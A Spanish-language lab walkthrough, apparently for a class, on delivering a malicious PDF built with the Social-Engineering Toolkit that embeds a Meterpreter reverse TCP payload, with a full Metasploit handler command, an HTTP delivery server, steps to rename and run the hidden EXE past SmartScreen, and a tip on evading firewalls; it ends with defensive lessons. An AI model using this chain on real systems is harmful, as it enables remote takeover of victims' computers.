¿Qué es un Reverse TCP Shell?

En vez de que el atacante se conecte a la víctima (lo que bloquearía un firewall), el payload hace que la víctima se conecte de vuelta al atacante. Por eso el LHOST siempre es la IP de Kali: es quien escucha.

02 — Reconocimiento

Verificar Puertos Disponibles en Kali

Antes de configurar el listener es buena práctica verificar que el puerto no esté en uso. En Kali, abrir una terminal y ejecutar:

kali@Kali: ~
$ ss -tlnp
State Recv-Q Send-Q Local Address:Port Peer Address:Port
LISTEN 0 128 0.0.0.0:22 0.0.0.0:*
LISTEN 0 128 [::]:22 [::]:*

# Solo el puerto 22 (SSH) está ocupado → el 4444 está libre ✓

Nota: El puerto 4444 es el predeterminado de Metasploit y funciona perfectamente en un lab cerrado. En pentesting real se prefieren puertos como 443 u 80 para evadir firewalls, ya que el 4444 es ampliamente reconocido por los IDS/IPS.

04 — Escucha

Configurar el Listener en Metasploit

Abrir una segunda terminal en Kali y lanzar Metasploit con todos los parámetros en un solo comando:

root@Kali: ~ — Terminal 1 (Metasploit)
# msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.254.147; set LPORT 4444; set ExitOnSession false; exploit -j"

[*] Processing /root/.set/meta_config for ERB directives.
resource (/root/.set/meta_config)> use multi/handler
resource (/root/.set/meta_config)> set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
resource (/root/.set/meta_config)> set lhost 192.168.254.147
lhost => 192.168.254.147
resource (/root/.set/meta_config)> set lport 4444
lport => 4444
resource (/root/.set/meta_config)> set ExitOnSession false
ExitOnSession => false
resource (/root/.set/meta_config)> exploit -j
[*] Exploit running as background job 0.
[*] Started reverse TCP handler on 192.168.254.147:4444
msf6 exploit(multi/handler) > _

Importante: Una vez que aparece "Started reverse TCP handler", esta terminal no se debe cerrar. Queda en espera pasiva hasta que la víctima se conecte.

05 — Entrega

Servir el PDF mediante HTTP

Abrir una tercera terminal en Kali. Navegar a la carpeta de SET y levantar un servidor HTTP simple con Python:

root@Kali: ~/.set — Terminal 2 (HTTP Server)
# cd /root/.set/
# python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...

# Cuando la víctima descargue el PDF aparecerán logs aquí:
192.168.254.148 - - "GET /template.pdf HTTP/1.1" 200 -

Si el puerto 8080 ya está en uso, usar otro: python3 -m http.server 9090. Verificar puertos ocupados con ss -tlnp | grep 8080.

06 — Ejecución

Entregar y Abrir el PDF en la Víctima (Windows)

1

Descargar el PDF desde el navegador

En la VM Windows, abrir el navegador e ir a:

Windows — Navegador
http://192.168.254.147:8080/template.pdf
2

Abrir con Adobe Reader (no con el navegador)

El PDF debe abrirse con Adobe Acrobat Reader. El visor del navegador no ejecutará el payload embebido. Clic derecho sobre el archivo → Abrir con → Adobe Acrobat Reader.

3

Adobe solicita guardar el archivo adjunto

Al abrir el PDF, Adobe Reader muestra un diálogo pidiendo guardar el archivo embebido (form.pdf — en realidad es un EXE). Hacer clic en Guardar y guardarlo en Descargas.

4

Renombrar y ejecutar el archivo

Windows oculta las extensiones por defecto. El archivo guardado como form o form.pdf es en realidad un EXE. Renombrarlo desde CMD:

Windows — CMD
C:\> cd %USERPROFILE%\Downloads
C:\Users\...\Downloads> dir form*
form.exe <-- el nombre real del archivo

C:\> ren form.pdf form.exe
C:\> form.exe

Si Windows SmartScreen lo bloquea: clic en "Más información" → "Ejecutar de todas formas".

08 — Conceptos

Conceptos Clave para la Presentación

Ingeniería Social

El ataque no explota una vulnerabilidad técnica del sistema operativo, sino la confianza del usuario en un archivo PDF. El PDF actúa como "señuelo" (pretexting) mientras el EXE embebido es el payload real.

Vector de Ataque vs. Payload

Vector: el PDF malicioso (el medio de entrega). Payload: el ejecutable Meterpreter que establece la conexión. SET genera ambos integrados.

¿Por qué falla en versiones modernas?

Adobe Reader moderno y Windows Defender bloquean este vector. En el lab funciona porque la VM tiene software intencionalmente desactualizado, replicando entornos reales de organizaciones que no aplican parches. Esto demuestra la importancia del patch management.

Lección de Defensa (Blue Team)

Contramedidas reales: mantener el software actualizado, no abrir adjuntos de fuentes desconocidas, activar el sandbox de Adobe Reader, usar EDR/XDR, y aplicar el principio de mínimo privilegio.
